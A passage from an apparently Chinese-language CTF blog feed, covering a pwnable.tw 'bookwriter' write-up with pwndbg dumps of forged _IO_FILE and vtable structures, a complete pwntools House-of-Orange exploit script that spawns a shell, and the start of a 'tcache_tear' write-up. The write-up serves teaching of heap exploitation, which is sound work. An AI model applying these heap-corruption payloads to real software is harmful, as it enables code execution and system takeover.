class=\"number\">0x7f7ba0e30b78</span> &lt;main_arena+<span class=\"number\">88</span>&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>下面很巧妙的东西来了，我们伪造_IO_list_all 的数据为 main_arena+88, 那么原本_  _chain 指向下一个 file 结构体，结果 fakeFIlede 的 chain 就是 smallbins 的入口马志翔里面的第一个 chunk。所以我们将 unsortedbin 里面的 topchunk 的 size 变小，就会进入 smallbin，然后 fakefile_chain --&gt;topchunk，我们利用溢出将 topchunk 伪造成另一个 fakefile2，并伪造 vtable。伪造 fakefile2 要注意， flag 写入的是‘/bin/sh\\x00’ , 因为 vtable 里面的函数大多会以 flag 作为自己的参数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x7f7ba0e30b78</span>   &lt;main_arena+<span class=\"number\">88</span>&gt; <span class=\"comment\">//伪造的第一个fakefile</span></span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">17100832</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x102c2c0</span> <span class=\"string\">&quot;/bin/sh&quot;</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x102c2c0</span> <span class=\"string\">&quot;/bin/sh&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x7f7ba0e31510</span> <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x7f7ba0e30b88</span> &lt;main_arena+<span class=\"number\">104</span>&gt; <span class=\"string\">&quot;\\300\\302\\002\\001&quot;</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x7f7ba0e30b88</span> &lt;main_arena+<span class=\"number\">104</span>&gt; <span class=\"string\">&quot;\\300\\302\\002\\001&quot;</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x7f7ba0e30b98</span> &lt;main_arena+<span class=\"number\">120</span>&gt; <span class=\"string\">&quot;\\210\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x7f7ba0e30b98</span> &lt;main_arena+<span class=\"number\">120</span>&gt; <span class=\"string\">&quot;\\210\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x7f7ba0e30ba8</span> &lt;main_arena+<span class=\"number\">136</span>&gt; <span class=\"string\">&quot;\\230\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x7f7ba0e30ba8</span> &lt;main_arena+<span class=\"number\">136</span>&gt; <span class=\"string\">&quot;\\230\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x7f7ba0e30bb8</span> &lt;main_arena+<span class=\"number\">152</span>&gt; <span class=\"string\">&quot;\\250\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x7f7ba0e30bb8</span> &lt;main_arena+<span class=\"number\">152</span>&gt; <span class=\"string\">&quot;\\250\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x102c2c0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0x102c2c0</span>, </span><br><span class=\"line\">    _fileno = <span class=\"number\">-1595733032</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">32635</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">140168956939224</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">3048</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">-29</span> <span class=\"string\">&#x27;\\343&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;\\240&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x7f7ba0e30be8</span> &lt;main_arena+<span class=\"number\">200</span>&gt;, </span><br><span class=\"line\">    _offset = <span class=\"number\">140168956939256</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x7f7ba0e30bf8</span> &lt;main_arena+<span class=\"number\">216</span>&gt;, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x7f7ba0e30c08</span> &lt;main_arena+<span class=\"number\">232</span>&gt;, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x7f7ba0e30c08</span> &lt;main_arena+<span class=\"number\">232</span>&gt;, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x7f7ba0e30c18</span> &lt;main_arena+<span class=\"number\">248</span>&gt;, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">140168956939288</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1595732952</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&quot;&#123;\\177\\000\\000(\\f\\343\\240&#123;\\177\\000\\000\\070\\f\\343&quot;</span>...</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0x7f7ba0e30c38</span> &lt;main_arena+<span class=\"number\">280</span>&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//bins</span></span><br><span class=\"line\">smallbins</span><br><span class=\"line\"><span class=\"number\">0x60</span>: <span class=\"number\">0x102c2c0</span> —▸ <span class=\"number\">0x7f7ba0e30bc8</span> (main_arena+<span class=\"number\">168</span>) ◂— <span class=\"number\">0x102c2c0</span></span><br><span class=\"line\">    </span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x102c2c0</span>\t\t\t\t<span class=\"comment\">//fakefile2</span></span><br><span class=\"line\">$<span class=\"number\">4</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">1852400175</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x61</span> &lt;error: Cannot access memory at address <span class=\"number\">0x61</span>&gt;, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x7f7ba0e30bc8</span> &lt;main_arena+<span class=\"number\">168</span>&gt; <span class=\"string\">&quot;\\270\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x7f7ba0e30bc8</span> &lt;main_arena+<span class=\"number\">168</span>&gt; <span class=\"string\">&quot;\\270\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x2</span> &lt;error: Cannot access memory at address <span class=\"number\">0x2</span>&gt;, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x3</span> &lt;error: Cannot access memory at address <span class=\"number\">0x3</span>&gt;, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _fileno = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&quot;\\377\\377\\377\\377&quot;</span>, <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">15</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0x102c3a0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//伪造的vtable</span></span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"type\">const</span> <span class=\"keyword\">struct</span> _IO_jump_t *) <span class=\"number\">0x102c3a0</span></span><br><span class=\"line\">$<span class=\"number\">8</span> = &#123;</span><br><span class=\"line\">  __dummy = <span class=\"number\">0</span>, </span><br><span class=\"line\">  __dummy2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">  __finish = <span class=\"number\">0x1</span>, </span><br><span class=\"line\">  __overflow = <span class=\"number\">0x7f7ba0ab13a0</span> &lt;__libc_system&gt;, </span><br><span class=\"line\">  __underflow = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __uflow = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __pbackfail = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __xsputn = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __xsgetn = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __seekoff = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __seekpos = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __setbuf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __sync = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __doallocate = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __read = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __write = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __seek = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __close = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __stat = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __showmanyc = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __imbue = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>下面要考虑的就是如何出发伪造的 vtable。首先我们这里的 fakefile2 取代了 stdout，所以当程序报错的输出信息时，会调用 over_flow，我们在伪造的 vtable 对应位置写入 system。</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./bookwriter&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./bookwriter&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">cnt = <span class=\"number\">0x602040</span></span><br><span class=\"line\">name = <span class=\"number\">0x602060</span>\t\t\t\t<span class=\"comment\">#size=64</span></span><br><span class=\"line\">gp = <span class=\"number\">0x6020A0</span>\t\t\t\t</span><br><span class=\"line\">gs = <span class=\"number\">0x6020E0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Your choice :&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">thename</span>(<span class=\"params\">text</span>):</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;Author :&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,text</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Size of page :&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;Content :&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Index of page :&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,text</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">3</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Index of page :&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;Content:&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">updatename</span>(<span class=\"params\">i,name=<span class=\"string\">&quot;&quot;</span></span>):</span><br><span class=\"line\">\tch(<span class=\"number\">4</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>,i)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> i==<span class=\"string\">&quot;1&quot;</span>:</span><br><span class=\"line\">\t\tthename(name)</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">gdb.attach(r,<span class=\"string\">&#x27;b malloc&#x27;</span>)</span><br><span class=\"line\">thename(<span class=\"string\">b&quot;A&quot;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">4</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\"><span class=\"comment\">#now the size0 is 0x20+3,wocan overflow 3 bytes</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">0x18</span>+p32(<span class=\"number\">0xfe1</span>)+<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">ch(<span class=\"number\">4</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;A&quot;</span>*<span class=\"number\">0x40</span>)</span><br><span class=\"line\">heap_addr = u64(r.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop = <span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x10</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>,<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x1000</span>,<span class=\"string\">&quot;\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">\tadd(<span class=\"number\">0x50</span>,<span class=\"string\">&quot;AAAAAAAA&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&quot;A&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">main_arena = u64(r.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>,drop = <span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libcbase = main_arena - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">list_all = <span class=\"number\">0x3c5520</span>+libcbase</span><br><span class=\"line\">system =libcbase + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;main_arena : &quot;</span>,<span class=\"built_in\">hex</span>(main_arena))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libcbase : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system : &quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"></span><br><span class=\"line\">onegadget = <span class=\"number\">0xcafebabedeadbeef</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">fakechunk =b&#x27;\\x00&#x27;*0x2b0</span></span><br><span class=\"line\"><span class=\"string\">pad =b&#x27;/bin/sh\\x00&#x27;+p64(0x61)</span></span><br><span class=\"line\"><span class=\"string\">pad+= p64(main_arena) +p64(list_all-0x10)+p64(2)+p64(3)</span></span><br><span class=\"line\"><span class=\"string\">pad =pad.ljust(0xc0,b&#x27;\\x00&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">pad +=p64(0xffffffffffffffff)</span></span><br><span class=\"line\"><span class=\"string\">pad = pad.ljust(0xd8,b&#x27;\\x00&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">vtable  = heap_addr+0x10+0x2b0 + 0xd8 + 0x8</span></span><br><span class=\"line\"><span class=\"string\">pad += p64(vtable)</span></span><br><span class=\"line\"><span class=\"string\">fake_vtable = p64(0)*2+p64(1)+p64(system)</span></span><br><span class=\"line\"><span class=\"string\">fakechunk+=pad+fake_vtable</span></span><br><span class=\"line\"><span class=\"string\">edit(0,fakechunk)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">data = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x2b0</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>+p64(<span class=\"number\">0x61</span>)+p64(main_arena)+p64(list_all-<span class=\"number\">0x10</span>)+p64(<span class=\"number\">2</span>)+p64(<span class=\"number\">3</span>)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0xc0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0xd8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">vtable = heap_addr + <span class=\"number\">0x2b0</span> + <span class=\"number\">0xd8</span> + <span class=\"number\">0x8</span>+<span class=\"number\">0x10</span></span><br><span class=\"line\">payload += p64(vtable)</span><br><span class=\"line\">payload +=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">1</span>)+p64(system)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,data + payload)</span><br><span class=\"line\">ch(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Size of page :&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x10</span>))</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/04/01/tcache-tear/",
            "url": "http://example.com/2022/04/01/tcache-tear/",
            "title": "tcache_tear",
            "date_published": "2022-04-01T12:21:22.000Z",
            "content_html": "<h1 id=\"pwnabletw\"><a class=\"markdownIt-Anchor\" href=\"#pwnabletw\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL3B3bmFibGUudHc=\">pwnable.tw</span> \ttcache_tear</h1>\n<h2 id=\"保护\"><a class=\"markdownIt-Anchor\" href=\"#保护\">#</a> 保护：</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/pwnable/Tcache Tear$ checksec --file=tcache_tear</span><br><span class=\"line\">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE</span><br><span class=\"line\">Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols\t  Yes\t<span class=\"number\">1</span>\t\t<span class=\"number\">2</span>\t\ttcache_tear</span><br><span class=\"line\">dreamcat@ubuntu:~/Desktop/pwnable/Tcache Tear$ strings libc<span class=\"number\">-2.27</span>.so | grep ubuntu</span><br><span class=\"line\">GNU C Library (Ubuntu GLIBC <span class=\"number\">2.27</span><span class=\"number\">-3u</span>buntu1) stable release version <span class=\"number\">2.27</span>.</span><br><span class=\"line\">&lt;https:<span class=\"comment\">//bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>64 位程序，FULLrelro 导致不能改写 got</p>\n<p>但是因为这个 libc 版本太老，tcache 不会检查 double free</p>\n<h2 id=\"主要程序\"><a class=\"markdownIt-Anchor\" href=\"#主要程序\">#</a> 主要程序：</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __fastcall __noreturn <span class=\"title function_\">main</span><span class=\"params\">(__int64 a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span 